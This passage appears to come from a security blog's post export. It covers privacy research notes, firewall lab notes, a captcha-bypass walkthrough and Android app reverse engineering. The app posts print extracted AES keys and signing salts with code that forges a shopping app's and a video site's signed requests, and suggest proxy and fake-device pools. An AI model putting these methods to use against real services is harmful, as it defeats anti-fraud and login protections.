recommendation system to implement the conventional recommendation algorithm.\nApplications of LDP in IoV We first introduce the attack models in IoV and then investigate the potential applications of LDP in several typical scenarios in IoV.\nAttack model in IoV   Malicious vehicle. On the one hand, they may deliberately disclose vehicles’ data to advertisers, illegal organizations. On the other hand, they may collude with others, send poisoning data, deliberately drop out during the process of completing IoV services, etc., aiming to disclosing other users’ data privacy or paralyzing the IoV systems.\n  Malicious server. Specifically, malicious server may be passive or active adversary. The passive adversary is curious about users’ data, but it honestly performs the protocols. In contrast, the active adversary may tamper the protocols or actively launch attacks to disclose users’ data privacy.\n  Query services in IoV A number of techniques have been proposed to protect users’ data privacy in academia.\nSpecifically, rule protocol-based privacy-preserving techniques are first proposed. However, it is high overhead for server to obtain vehicles’ authorization before utilizing vehicles’ data in IoV, because of the unique features vehicles exhibit, e.g., high mobility, short connection times, etc.\nEncryption techniques allow the server to collect and process the encrypted data of vehicles. Nevertheless, it is not applicable to large amounts of vehicles’ data due to the extremely high computation overhead.\nHeuristic algorithms, e.g., dummy, k-anonymity, pseudonym, cloaking, m-invariance, etc., are quite lightweight compared to encryption techniques. But all these heuristic algorithms are vulnerable to the side information-based attacks.\nIn summary, LDP that is relatively lightweight and thoroughly considers side information of attackers is promised to protect vehicles’ data privacy in query services in IoV.\nCrowdsourcing in IoV Many existing work has focused on protecting data privacy in crowdsourcing. Work [114] introduces a third party, the cloud, that is responsible for storage and computation burden. Study [115] proposed a general feedback-based k-anonymity scheme to cloak users’ data. The literature [116] utilized a random perturbation to mask users’ data and employed the error-correcting codes to guarantee data utility. However, all these existing work ignores the side information of attackers and therefore is susceptible to side information-based attacks. Furthermore, these work is not applicable to the data privacy preservation in IoV, as density of vehicles is varying, and vehicles move with high speed and can only be connected in short time.\nIn such a case, LDP is applicable to protect vehicle users’ data privacy in crowdsourcing applications in IoV, as it thoroughly considers the available side information of attackers and is a lightweight privacy-preserving method.\nFuture research opportunities In IoV, the complexity, diversity, and large-scale nature of vehicle data will add new data privacy risks. Therefore, we believe that LDP will face many new challenges：\n LDP for complex data types in IoV. At present, the research of LDP mainly focused on simple data types, e.g., frequency statistics or mean value statistics on set-valued data that only contains one attribute. However, in IoV, the structural characteristics of vehicle data make the global query sensitivity extremely high and bring in excessive noise. LDP for various query and analysis tasks in IoV. At present, the existing work about LDP only investigated the privacy preservation in the two types of simple aggregate queries, i.e., counting queries of the discrete data and mean queries of the continuous data. Furthermore, the way of data perturbation is generally depended on the types of queries. In IoV, a variety of query services are provided, and thus, LDP faces many new challenges. High-dimensional vehicle data publication based on LDP. In IoV, the set-valued data contains many attributes, and the existing studies about LDP will not work, as they only focused on simple data types. Improvements in the LDP model for IoV. In practice, the value of the privacy-preserving parameter 휖 still does not have a standard. Although the physical meaning of parameters in k-anonymity and l-diversity is intuitive, the privacy preservation provided by 휖-differential privacy is relatively vague, which indicates that the problem is still up in the air. Considering correlations among vehicle data with LDP. Local differential privacy assumes that vehicle data are independent of each other, i.e., ignoring the correlations among vehicle data. However, in practice, vehicle data may be dependent. Combinations the LDP model with other techniques, e.g., machine learning, AI, and so on. AI techniques are expected to provide potential solutions to, e.g., smart city, intelligent transportation, travel route recommendation, environment monitoring, air quality navigation, map navigation, etc., in IoV.  ","date":"2022-01-13T21:20:48+08:00","permalink":"https://chinggg.github.io/post/ldp-iov/","tags":["论文笔记","安全","隐私保护"],"title":"Local Differential Privacy for IoV"},{"categories":["安全"],"contents":"SEED Labs 2.0 - Network Security Firewall 使用 NetFilter 自制防火墙 LKM Netfilter 是 Linux 内核中一个用于管理网络数据包的软件框架，可以使用它自制 Linux Kernel Module，实现简易的防火墙。\nTask1 只是练习如何编译内核模块，即在 module_init(fn), module_exit(fn) 处初始化及退出。\n使用 Netfilter 搭建防火墙的步骤：\n 定义 nf_hook_ops 结构体，给 hook(hook函数) 和 hooknum(hook点类型) 赋值  struct nf_hook_ops { /* User fills in from here down. */ nf_hookfn\t*hook; struct net_device\t*dev; void\t*priv; u8\tpf; enum nf_hook_ops_type\thook_ops_type:8; unsigned int\thooknum; /* Hooks are ordered in ascending priority. */ int\tpriority; };    模块加载时 nf_register_net_hook(\u0026amp;init_net, \u0026amp;hook1)，卸载时 nf_unregister_net_hook(\u0026amp;init_net, \u0026amp;hook1)\n  nf_hookfn 函数签名如下，实验中只需 ip_hdr(skb) 获得 iphdr 结构体（类似有 tcphdr/udphdr），再从 iph 获得协议类型、源/目标地址，从 tcph/udph 获得端口号，比较决定是否 DROP 即可。\n  typedef unsigned int nf_hookfn(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);   注意每个结构体只能赋值一个 hooknum，想在多个点上 hook 需定义多个 nf_hook_ops，分别设置不同的 hooknum，枚举类型如下：  enum nf_inet_hooks { NF_INET_PRE_ROUTING, NF_INET_LOCAL_IN, NF_INET_FORWARD, NF_INET_LOCAL_OUT, NF_INET_POST_ROUTING, NF_INET_NUMHOOKS, NF_INET_INGRESS = NF_INET_NUMHOOKS, };  使用 iptables 基本命令 iptables -A {chain} -j {rule}，-i/o {dev} 指定入/出接口，-s/d 指定源/目标地址，-sport/dport 指定源/目标端口\n对于 TCP 连接，使用 conntrack 模块搭建有状态防火墙，只允许已经建立的 TCP 连接和内部发起新连接\n限流使用 limit 模块，--limit 指定设置最大频率（即如10次/分钟），--limit-burst 指定最大连续次数\n负载均衡使用 statistic 模块，--mode 指定模式为 random 或 nth，random 模式下 --probability 指定概率，nth 模式下 --every n 指定轮转周期，--packet p 指定初始计数值（即从[0,n-1]中某处开始计数），一般配合 -j DNAT --to-destination {ip:port} 使用\nVPN_Tunnel 实验基于 TUN/TAP 技术，TUN 模拟网络层设备，TAP 模拟数据链路层设备，用户程序和操作系统可以通过 TUN/TAP 接口互相传递数据包。\nClient Program send(ip) -\u0026gt; Client TUN read(ip) -\u0026gt; Client Socket send(udp/ip) -\u0026gt; Server Socket recv(udp/ip) -\u0026gt; Server TUN write(ip) -\u0026gt; ... route to dst then got reply routed back ... Server TUN read(ip) -\u0026gt; Server Socket send(udp/ip) -\u0026gt; Client Socket recv(udp/ip) -\u0026gt; Client TUN write(ip) -\u0026gt; Client Program recv(ip)  参考文献  https://arthurchiao.art/blog/deep-dive-into-iptables-and-netfilter-arch-zh/ ","date":"2022-01-07T20:57:24+08:00","permalink":"https://chinggg.github.io/post/seed-network/","tags":["实验"],"title":"SEEDLab Network"},{"categories":["安全"],"contents":"字符型验证码 SimGAN-Captcha代码阅读与复现 关于SimGAN-Captcha的扩展实验 全都得死：GAN掉字符验证码\n小试牛刀 先尝试模拟，使用 puppteer 稍加计算就能成功绕过极验\n请求依次为\n POST https://passport.bilibili.com/x/passport-login/sms/send 设备信息为 body，返回 recaptcha_url 随即向其发起请求，注意该 url 中的 gt 和 challenge 将用于后续一系列请求 GET https://www.bilibili.com/h5/project-msg-auth/verify?ct=geetest\u0026amp;recaptcha_token=\u0026amp;gee_gt=\u0026amp;gee_challenge=\u0026amp;hash= 即向之前获得的 recaptcha_url 发送 GET 请求跳转到页面 GET https://api.geetest.com/gettype.php?gt=\u0026amp;callback=geetest_{13位毫秒时间戳} 返回一些配置参数如静态js文件的位置（即相对路径） GET https://api.geetest.com/get.php?gt=\u0026amp;challenge=\u0026amp;lang=zh-cn\u0026amp;pt=3\u0026amp;client_type=web_mobile\u0026amp;w={一长串}\u0026amp;callback= 仍然返回一些配置如验证开始前显示的i18n字符串 GET https://api.geetest.com/ajax.php?gt=\u0026amp;challenge=\u0026amp;lang=zh-cn\u0026amp;pt=3\u0026amp;client_type=web_mobile\u0026amp;w=\u0026amp;callback= 第一次请求 ajax.php，返回 callback值({\u0026quot;status\u0026quot;: \u0026quot;success\u0026quot;, \u0026quot;data\u0026quot;: {\u0026quot;result\u0026quot;: \u0026quot;slide\u0026quot;}}) GET https://api.geetest.com/get.php 此时刚加载了 slide.js，和第一次请求 get.php 相比多了一些 params 如 is_next=true\u0026amp;type=slide3，返回结果中有滑块验证时会显示的i18n字符串，以及滑块和图片的位置 GET https://api.geetest.com/ajax.php?gt=\u0026amp;challenge=\u0026amp;lang=zh-cn\u0026amp;%24_BBF=3\u0026amp;client_type=web_mobile\u0026amp;w=\u0026amp;callback= 最终的请求，返回 success 及 score  工程化探索 将验证码填充作为通用服务运行，让爬虫客户端无感绕过验证码，考虑在客户端和服务端（比如 puppeteer）之间使用 RPC，客户端先调起服务端，服务端进入验证码流程，但将所有请求拦截并通过 RPC 传递给客户端，客户端代为请求，响应结果作为 RPC 的返回值，服务端再强行将其作为响应，继续之后的动作，从而在验证方看来客户端正常完成了验证。\n真正开发过程中，很多时间浪费在了数据类型造成的错误中，在 proto 中我把除状态码外的所有字段定为 string，但用 axios 等库发起请求时，header 为 object，且若不在请求时指定 responseType，所获响应默认用 json 解析成 object，否则才是 text。更坑的是图片等二进制数据，获得为文本时已经铸成大错，需要先指定 responseType 为 arraybuffer（在 Node 中 blob 实际还是以文本返回，因为 blob 是 browser only），然后 res.data.toString('base64') 转成 base64 字符串通过 RPC 传递，接收方再 Buffer.from(str, 'base64') 来转成 buffer。\nJS逆向：AST还原极验混淆JS实战\n反符号混淆和控制流平坦化\n","date":"2021-12-24T16:27:26+08:00","permalink":"https://chinggg.github.io/post/bili-captcha/","tags":["逆向"],"title":"某网站的极验验证码实战"},{"categories":["安全"],"contents":"App 逆向基础 国产应用大多热衷于构筑自己的 App 围墙，很多功能没有网页版，也就无法利用浏览器一探究竟，不过我们仍然可以通过抓包、静态分析、动态调试的方法解开隐藏在 App 中的秘密。\n抓包能让我们快速获得想要的 API，不过其门槛也在不断增高，Android 7.0 之后应用不再相信非系统证书，客户端应用也可能使用 SSL Pinning 等技术防止中间人的干扰，一般用 Xposed 模块 JustTrustMe 或 TrustMeAlready 可以解决，某些关键请求可能还需额外 hook，可以为其专门定制 Xposed 模块。\n抓包获得关键请求后，分析其字段的意义，并在静态分析工具中全局搜索，定位至相关函数，应用大多会将数据编码、加密或生成摘要，这些逻辑可能放在 native 层实现，增大了逆向的难度。\n所幸 frida 等工具的出现大大便利了动态调试，可以方便地 hook 得到 Java 层各个类及其成员、方法，对于 native 层，也可在获得函数的参数和返回值，快速验证逆向分析时的想法。若由于时机等原因难以 hook，还可直接将 so 库封装到自己创建的 app 中，在 build.gradle 里添加 abiFilters 参数以指定 arm 指令集，手动复制关键类并 import，再在 MainActivity 里 loadLibrary，即可直接调用 native 层方法，调试并在断点之间 hook 更改 context 寄存器的值，查看变量的值。\n逆向得到加密数据、生成校验的算法后，便可以伪造合法的请求。编码上的细节需要多加考虑，抓包得到 params 或 body 中的参数大都是 urlencode 后的结果，但生成校验时的参数却可能是原始的字符串，构造请求时要头脑清醒。排查错误时要冷静，关键位置往往是正确的，但完全没料到的地方可能出岔子，比如谁能想到 f-string 中嵌入 bytes 型的参数，不会报错，生成的字符串里居然还带着引号，而且作为 body 发送居然看上去一模一样？\nbstr = b'feiwu' fstr = f'woshi {bstr}' print(fstr) # woshi b'feiwu'  不能以脚本小子的心态写脚本，必须做好代码的类型标注，模块化编程，这样即使无法避免问题的发生，也能在问题出现时快速定位。排查问题时脑子注意转过弯来，如果加密算法中有随机值，先固定下来，在静态的层面上观察结果，与真实样本做对比。\n实战案例复盘 某品会 edata 参数(AES 加密)\n仅有少量请求有 edata 参数，从一串 query params 型的键值对字符串，得到 AES 加密并 base64 编码后的 edata 结果，具体实现在 esNav 这个 native 函数中。\n首先静态分析，IDA 反编译后两百多行，一上来就从全局变量中获取了未知的字符串，然后放入不知所云的 gsigds 函数中进行一通操作。此时盲目扎进细节中耗时耗力而且白费功夫，只需抓住 AES 加密的核心，无非是 key 和 iv，倒过来分析代码发现前者是 md5 后的值，后者是随机的16位 hex 字符串，生成 edata 的前十六位字符便是 iv，后面再拼接 AES 加密的结果，这样服务器获得发送过来的 edata 后即可对称解密，而 key 显然应该是每次固定的，所以只需 hook 生成 md5 的函数获得返回值，便能得到 key 进而实现加密算法。\n但在测试手机上发现该应用在运行时 hook 容易崩溃，只能以 spawn 的形式 hook， 而抓包发现 edata 的请求似乎只在初始化时发送，刚启动时 native 层中的关键函数又尚未被加载，很难有合适的时机 hook，这时就可以自制 App 直接调用 Java 层函数，在断点之间 hook 即可拿到 key。\n某品会 api_sign 验证头(SHA1 摘要)\n每一个请求头都会带上 Authorization: OAuth api_sign={}，全局搜索定位到 native 函数 gsNav，是从 TreeMap\u0026lt;String, String\u0026gt;(也就是 query params) 得到一串 SHA1 摘要。\n进 IDA 分析，发现仍然调用了 gsigds 函数获取字符串，传入 getByteHash 获得了32位的 hex 字符串作为盐，拼接在从 Map 转成的 query param 型字符串前进行 SHA1 摘要，再对结果再来一次加盐摘要即得 api_sign，实际上如果熟悉 SHA1 的话看到 api_sign 是长为40的 hex 应该就能想到。\nimport base6 import hashlib import json import random from urllib.parse import unquote, parse_qsl, urlencode from Crypto.Cipher import AES from Crypto.Util.Padding import pad def gen_sign(paramstr: str) -\u0026gt; str: \u0026quot;\u0026quot;\u0026quot;paramstr will unquoted automatically\u0026quot;\u0026quot;\u0026quot; paramstr = unquote(paramstr).encode() salt = b\u0026quot;da19a1b93059ff3609fc1ed2e04b0141\u0026quot; # True salt = b\u0026quot;aee4c425dbb2288b80c71347cc37d04b\u0026quot; # False h1 = hashlib.sha1(salt + paramstr) cipher1 = h1.hexdigest().encode() h2 = hashlib.sha1(salt + cipher1) return h2.hexdigest() def gen_edata(paramstr: str) -\u0026gt; str: \u0026quot;\u0026quot;\u0026quot;paramstr: app_name=...\u0026amp;dinfo=...\u0026quot;\u0026quot;\u0026quot; paramstr = paramstr.encode() paramstr = pad(paramstr, 16) key = bytearray.fromhex(\u0026quot;8c c7 03 f6 47 8e 58 f0 84 49 d5 c0 cf 2d d5 83\u0026quot;) # True key = bytearray.fromhex(\u0026quot;cd d1 7a b2 9b 84 b3 25 52 dd cf bb 4a bf 02 25\u0026quot;) # False key = bytes(key) ran16b = ''.join(random.choices('0123456789abcdef', k=16)).encode() cipher = AES.new(key, AES.MODE_CBC, iv=ran16b) enctext = cipher.encrypt(paramstr) ans = base64.b64encode(ran16b + enctext) return ans.decode() def dec_edata(b64s: str) -\u0026gt; str: enctext = base64.b64decode(b64s.encode()) key = bytearray.fromhex(\u0026quot;8c c7 03 f6 47 8e 58 f0 84 49 d5 c0 cf 2d d5 83\u0026quot;) # True key = bytearray.fromhex(\u0026quot;cd d1 7a b2 9b 84 b3 25 52 dd cf bb 4a bf 02 25\u0026quot;) # False key = bytes(key) iv = enctext[:16] cipher = AES.new(key, AES.MODE_CBC, iv=iv) raw = cipher.decrypt(enctext[16:]) try: return raw.decode() except: return raw  某物 app so newSign 参数分析\n常规抓包只能看见小部分请求，检索 NO_PROXY，发现 okhttp3.OkHttpClient$Builder.proxy 处可以 hook，果然 hook 后才可抓到关键请求如 /api/v1/app/search/ice/search/list，检索该 URL 果然在 com.XXX.common.base.delegate.tasks.net.ApiConfigCons 中发现了 BLACK_LIST 这一个黑名单集合。\n搜索请求中的 newSign 字段，发现 WebRequestInterceptor.intercept 会给请求附上 newSign， 其值为 RequestUtils.c(hashMap, timestamp) 的结果，c 这个方法就是在 map 中再补充一些键值对，然后生成按字典序拼接 kv 得到的字符串，传进 AESEncrypt.encode(context, str) 方法，返回值再套一层 f 方法（即 md5）即为最终的 newSign。关键是 AESEncrypt.encode 这个方法里调了 NCall.IL() 这个 Native 函数，然而在 libGameVMP.so 中却无法继续跟踪，用 frida dump 出的 so 不再显示格式错误，但仍然找不到 IL 这个函数。\n模拟 Bili Android 客户端\nYmlsaWJpbGk= app分析\nNative逆向指北(一)——BiliBili Sign\ncom.bilibili.lib.accounts.BiliAuthService 列出了登录相关 API，com.bilibili.lib.accounts.a implements com.bilibili.okretro.interceptor.DefaultRequestInterceptor 会给这些请求 addCommonParam，并在最后附加 sign([0-9a-f]{32})，注意 a 重写了 DefaultRequestInterceptor 的方法，不要 hook 错成后者。\nstatistics={\u0026quot;appId\u0026quot;:1,\u0026quot;platform\u0026quot;:3,\u0026quot;version\u0026quot;:\u0026quot;6.54.0\u0026quot;,\u0026quot;abtest\u0026quot;:\u0026quot;\u0026quot;} qdic_base = {'appkey': '783bbb7264451d82', 'build': '6540300', 'buvid': '^XY[A-F0-9]{35}', 'c_locale': 'zh-Hans_CN', 'channel': 'bili', 'mobi_app': 'android', 'platform': 'android', 's_locale': 'zh-Hans_CN', 'statistics': json.dumps(statistics, separators=(',', ':'))}  以上参数是所有请求的 base query，可固定在配置文件中，这样针对特定请求仅需添加 extra query 即可\n其中 buvid 跟到 com.bilibili.lib.blkv.internal.kv.KVs.getString(\u0026quot;buvid\u0026quot;, \u0026quot;\u0026quot;)，因为自行实现的 KV 存储，但有 getString 就会有 putString，直接 hook java.util.HashMap 的 put 方法，最早 put buvid_local 是在 com.bilibili.lib.biliid.api.c.b.a 这个方法中，而该方法里调用了 interface w1.g.x.g.a 的 a 方法得到字符串，无法直接跳转，找 interface 的实现，最终在 w1.g.x.g.d.b 中生成字符串，传入参数是 interface w1.g.x.g.b 类型，依次调用其 c, d, a, b 方法，获得非空字符串则进行操作直接返回，静态跟入太烦，直接 hook 该参数打印四个方法所得字符串，发现就生成 buvid 而言，c 为空，d 为 MAC 地址，则直接对 MAC 地址进行相应 md5 操作即可，验证结果一致。\nsign 的生成在 com.bilibili.nativelibrary.LibBili.signQuery(Map\u0026lt;String, String\u0026gt;)，实际调用 native 函数 s，但其在 libbili.so 中是动态注册的，考虑编写 Xposed 模块主动调用\n[RegisterNatives] java_class: com.bilibili.nativelibrary.LibBili name: s sig: (Ljava/util/SortedMap;)Lcom/bilibili/nativelibrary/SignedQuery; fnPtr: 0xc13138e9 fnOffset: 0x68e9 callee: 0xc1313303 libbili.so!JNI_OnLoad+0x14e  public String genSQ(Map\u0026lt;String, String\u0026gt; map) { try { Class cls = XposedHelpers.findClass(\u0026quot;com.bilibili.lib.accounts.a\u0026quot;, g_classLoader); Object ins = XposedHelpers.newInstance(cls); Object res = XposedHelpers.callMethod(ins, \u0026quot;signQuery\u0026quot;, map); return res.toString(); } catch (Exception e) { e.printStackTrace(); Log.e(TAG, map.toString() + \u0026quot; \u0026quot; + g_classLoader.toString()); } return \u0026quot;\u0026quot;; }  登录界面输完手机号，点击发送短信验证码会向 https://passport.bilibili.com/x/passport-login/sms/send 发起请求，除了用户控制的 cid 和 tel 该请求还需附带 login_session_id 和 device_tourist_id，不难逆得前者 buvid 拼接毫秒 timestamp 再 md5 得到长为16的 hex 字符串，后者实际键名为 guest_id，应用初始化时向 https://passport.bilibili.com/x/passport-user/guest/reg 发请求拿到，而该请求又要附带 dt 和 device_info 两个参数。\n接着 hook 对应函数和 HashMap 键值，得到关键类 com.bilibili.lib.accounts.BiliPassportApi 和方法 l,k,j，其中 l 创建了一个 kotlin Function，依次传到 j 中再 invoke，hook com.bilibili.lib.accounts.BiliPassportApi$getGuestID$1(这是一个 Function) 的构造方法即可看到传入的 HashMap 在 com.bilibili.lib.accounts.e.a 中生成\n{ \u0026quot;AndroidID\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;BuildBrand\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;BuildDisplay\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;BuildFingerprint\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;BuildHost\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;Buvid\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;DeviceType\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;MAC\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;fts\u0026quot;: \u0026quot;\u0026quot; }  invoke 返回 JSONString，getBytes 传入 com.bilibili.lib.accounts.n.c c，c 返回 Pair\u0026lt;随机[A-Z][a-z][0-9]{16}字符串, 长为bytes两倍的HEX字符串\u0026gt;，前者作为 AES/CBC/PKCS5Padding 的 key 和 IV 加密 JSONString 转成的 bytes，后者是 AES 加密后的 bytes 转成 HEX。然后再调用 com.bilibili.lib.accounts.model.AuthKey encrypt 对前者做 RSA/ECB/PKCS5PADDING 公钥加密并 b64encode，最后前者为 dt，后者即为 device_info 发送。RSA 的公钥又从哪来？https://passport.bilibili.com/x/passport-login/web/key 即得，因为不变动所以直接存为常量，注意加密时掐头去尾了。那么对方后端接收到 dt 后先 b64decode 再用私钥解密，即得 AES 的 key，然后即可解密 device_info\nsms/send 只是短信登录的一半，该请求返回非空字符串 recaptcha_url 或 captcha_key，若为前者则需先完成极验滑动验证码才能继续登录流程，后者则直接发送了验证码，带上 captcha_key 和短信接收到的 code 向 login/sms 发 POST 请求即可完成登录，返回 JSON 数据，包含关键信息如 mid（即用户 id）和 access_token（附加在后续请求头 authorization 中）\n密码登录 https://passport.bilibili.com/x/passport-login/oauth2/login，明文密码前拼接上 web/key 得到的 hash，做 RSA/ECB/PKCS5PADDING 公钥加密并 b64encode，dt 和 device_meta 组合仍然是一对，前者是 RSA 加密过的 AES 密钥，后者是 Function0 BiliPassportApi$loginV3$1 invoke() 后返回的 JSONString 做 AES 加密的 HEX 结果。返回 message 可能为 验证码错误 或 账号存在风险需使用手机号验证，前者则 url 为 h5 验证码，后者则 url 为短信验证码（点击发送前仍会弹出验证码），\n琐碎的参数看的人头晕眼花，本质都是设备指纹（FingerPrint，缩写为fp），注意常见\n接着看私信，抓包得 https://app.bilibili.com/bilibili.im.interface.v1.ImInterface/，发私信即 SendMsg，实测重放请求就能收到多条信息，有意思的是 Content-Type: application/grpc，看到这个就该想到直接找 protobuf 定义了，但初遇没经验还是在 Java 层抽丝剥茧，com.bapis.bilibili.im.interfaces.v1.ReqSendMsg，一路追溯确实能精准定位到方法 w1.g.h.d.b.b.i.t0.R 初次返回了具有附带足够信息的 Message，但对于这种场景，与其挖空心思跟踪客户端层面数据是如何生成的，不如直接从最终请求的层次上搞清数据是什么。\n工程化知识沉淀 抓包阶段：\n要抓总能抓到，熟练使用趁手的软件\n注意数据的呈现格式，以 Fiddler 为例， WebForms 栏中展示的是 urldecode 后的结果，而 TextView 和 SyntaxView 才是原始格式，对于 Content-Type: application/x-www-form-urlencoded 的 POST 请求亦是如此\n分析请求中的基础参数，迅速导出为 JSON 备用\n逆向阶段：\n动静结合，静态查找 URL 或参数名称，从网络请求跟进到数据获取一般比较直接，但异步数据何时生成，由何生成可能难以看出，可以动态 hook 数据获取的函数以及 HashMap SharedPreference 等存取键值的函数，在打印的调用栈上获得下一步静态分析的目标，以此往复。\n有时会看到新的语言特性，JADX 无法将 kotlin.jvm.functions.Function0 还原为类，而 GDA 做的就比较好\n解密阶段：\n区分字符串在 bytes 和 字符编码层面的表示，熟练转换 json, str, bytes, hexstring, bytearray\n理解对称加密、非对称加密、摘要算法各自的特点和用途，熟知 MD5, AES, RSA 在 Java 与 Python 库中的实现，知道 PKCS5 与 PKCS7 的异同 常见流程：生成 [A-Z][a-z][0-9]{16} 的随机字符串，作为 AES 的 (128bit) Key 或 IV，对 bytes 明文进行加密，然后 AES Key 又用 RSA 公钥加密，把两者都在请求中发送，服务端用私钥解密得 AES Key，然后再 AES 解密明文。\n请求阶段：\nfrom urllib.parse import parse_qsl, quote, urlencode 熟练使用网络请求库，如 requests.post 如果 data 为字符串，Content-Type 默认为空，服务端预期为 application/x-www-form-urlencoded，故而会返回错误\n使用 Sekiro 快速搭建主动调用加密函数的 API\nAndroid逆向之无加固下的Java层和Native层模拟的调度解决方案\n池化阶段：\n打造批量 IP 代理池、伪造设备池，熟悉各种设备指纹\n参考文献 https://pitechan.com/爬虫工程师的自我修养之基础模块/\nhttps://curz0n.github.io/2021/05/10/android-so-reverse/\n主流安卓APP反作弊及反反作弊的一些思路和经验汇总\n","date":"2021-11-30T14:36:28+08:00","permalink":"https://chinggg.github.io/post/appre/","tags":["逆向"],"title":"AppRE"},{"categories":["记录"],"contents":"用上 Btrfs 不到两个月，还没怎么享受透明压缩和增量快照带来的好处，却已为它熬过几个艰难的夜晚\n先是 WinBtrfs 的问题，btrfs check --repair 幸运地修回来，果断注册表里改成只读\n但之后在 Arch 中作死用 VMWare 从物理磁盘启动自身，却造成了毁灭性后果，整个系统突然变为 ro，重启后果然 transid error 无法进入\n老规矩先抢救数据， restore 到 ext4 格式的移动硬盘（exFAT 真没用）\n这次虽然 transid 只差了 1，但 check 后发现问题比上次更为严重，check -b, check -s 1 结果都不妙\n记下 btrfs-find-root 的结果以备之后 repair\n但可惜 repair 也无能为力，可能还让事情更糟了，试了 rescue zero-log 也没救回\n神奇的是进 Win 还能正常识别文件，也不知道是 repair 还是 rescue 让 btrfs 分区能直接挂载了\n现在问题变成了 EIO，理论上是盘坏了但它肯定没坏，数据都还能读但无法恢复正常\n没办法，趁还可以挂载 btrfs 分区，rsync -aviHAXKhP 再备份一遍到移动硬盘（注意 exclude 快照和无用大目录，否则等一晚上）\n把 btrfs 分区格了再从移动硬盘拖回去，子卷化，改 fstab，重做 grub 引导，终于进入了熟悉的 Arch\n然而用户配置等方面还是有问题，可能第二回的备份不全，把之前备份的配置覆盖回去。pacman 还有数据不一致问题，overwrite 解决\n","date":"2021-11-28T20:50:22+08:00","permalink":"https://chinggg.github.io/post/btrfs/","tags":["环境配置","长期"],"title":"Btrfs 踩坑记录"},{"categories":["安全"],"contents":"Frida 万金油动态调试工具，配合自己收集定制的 hook 模板代码，稍作修改就可以快速查看 Java 层的类及其方法成员信息和 Native 层函数的参数与返回值，便于验证自己的想法，但实际上手可能还会遇到不少坑点令人苦恼：\n Java/Native 层数据结构映射到 JS 这种动态语言，可能需要 cast 或者自己转换成 JS 中的类型 Native 层通过 findExportByName 获取函数不够准确，可能还要通过地址 不应发生的 cannot access address \u0026hellip; 问题  https://www.anquanke.com/post/id/195869\nhttps://kevinspider.github.io/fridahookjava/\nhttps://kevinspider.github.io/fridahookso/\nhttps://kevinspider.github.io/zhuabao/\nhttps://eternalsakura13.com/2020/07/04/frida/\nhttps://github.com/lasting-yang/frida_dump/\nhttp://www.juziss.cn/2020/07/11/彻底搞定Hook不上/\nfunction map2obj(map) { var res = {}; var keyset = map.keySet(); var it = keyset.iterator(); while (it.hasNext()) { var keystr = it.next().toString(); var valuestr = map.get(keystr).toString(); res[keystr] = valuestr } return res; } function body2str(reqBody) { const Buffer = Java.classFactory.use(\u0026quot;okio.Buffer\u0026quot;); const buf = Buffer.$new(); reqBody.writeTo(buf); return buf.readUtf8(); return buf.toString(); // only get summary } function printable(variable, type) { if (type.includes(\u0026quot;Map\u0026quot;)) { return JSON.stringify(map2obj(variable), null, 4) return variable.entrySet().toArray() } if (type.includes(\u0026quot;RequestBody\u0026quot;)) { return body2str(variable) } return variable; } function dfs(self, depth) { if (depth \u0026gt; 6) return {} const obj = {} const cls = self.getClass() const fields = cls.getDeclaredFields() // console.log(\u0026quot;-\u0026quot;.repeat(depth), \u0026quot;dfs\u0026quot;, cls, self) // console.log(\u0026quot;-\u0026quot;.repeat(depth), \u0026quot;fields:\u0026quot;, fields) const immediates = ['short', 'int', 'long', 'float', 'double', 'boolean', 'String'] fields.forEach(x =\u0026gt; { x.setAccessible(true) const v = x.get(self) if (v === null) return const s = x.toString() // public type fullname // const type = x.getType() // class java.lang.String // const k = x.getName() // short name // console.warn(x, v, k, type) if (immediates.some(type =\u0026gt; s.includes(type))) { obj[x] = v.toString() } else { // inner class obj[x] = dfs(v, depth+1) } }) return obj } function hookJava() { var cls = Java.classFactory.use(\u0026quot;com.package.classname\u0026quot;); cls.methodName.implementation = function (a1, a2, a3, a4) { console.log('\u0026gt;'.repeat(10), \u0026quot;hookJava begin\u0026quot;) let a2str = JSON.stringify(map2obj(a2), null, 4) console.log(a1, a3, a4) console.warn(a2str) var res = this.methodName(a1, a2, a3, a4) console.warn('res:', res) return res console.log(\u0026quot;hookJava end\u0026quot;, '\u0026lt;'.repeat(10)) } } function printStack() { console.log(Java.use(\u0026quot;android.util.Log\u0026quot;).getStackTraceString(Java.use(\u0026quot;java.lang.Exception\u0026quot;).$new())) } function hookJavaFunc(clsName, funcName, argtypes, rettype, stack, func) { const cls = Java.classFactory.use(clsName) let funcObj = cls[funcName]; if (argtypes !== undefined) funcObj = funcObj.overload(...argtypes); const defaultFunc = function () { console.log('\u0026gt;'.repeat(10), funcName, \u0026quot;begin\u0026quot;) const argc = Array.from(arguments).length if (argtypes == null) argtypes = Array(argc) for (let i = 0; i \u0026lt; argc; i++) { console.log(printable(arguments[i], argtypes[i])); } const res = funcObj.apply(this, Array.from(arguments)) console.warn('res:', printable(res, rettype)) console.log(funcName, \u0026quot;end\u0026quot;, '\u0026lt;'.repeat(10)) if (stack) printStack() return res } funcObj.implementation = func || defaultFunc; } function hookMap(keywords) { const cls = Java.classFactory.use(\u0026quot;java.util.HashMap\u0026quot;) cls.get.implementation = function (key) { const res = this.get(key) const kStr = key ? key.toString() : '' if (keywords.some(w =\u0026gt; kStr.includes(w))) { console.error(\u0026quot;hookMap get\u0026quot;, key, \u0026quot; =\u0026gt; \u0026quot;, res) printStack() } return res } cls.put.implementation = function (key, value) { const res = this.put(key, value) const kStr = key ? key.toString() : '' // const vStr = value ? value.toString() : '' if (keywords.some(w =\u0026gt; kStr.includes(w))) { console.error(\u0026quot;hookMap put\u0026quot;, key, value) printStack() } return res } } function hookProxy() { var cls = Java.classFactory.use(\u0026quot;okhttp3.OkHttpClient$Builder\u0026quot;); cls.proxy.implementation = function (a1) { console.log('\u0026gt;'.repeat(10), \u0026quot;hookProxy begin\u0026quot;) console.warn(a1) return this } } function hookNative() { let m = Process.findModuleByName('lib.so') let f = Module.findExportByName('lib.so', 'Functions_xx') console.log(m.base, f) // f = m.base.add(0xBDB8C) Interceptor.attach(f, { onEnter: function (args) { console.warn(\u0026quot;args:\u0026quot;, args[1], 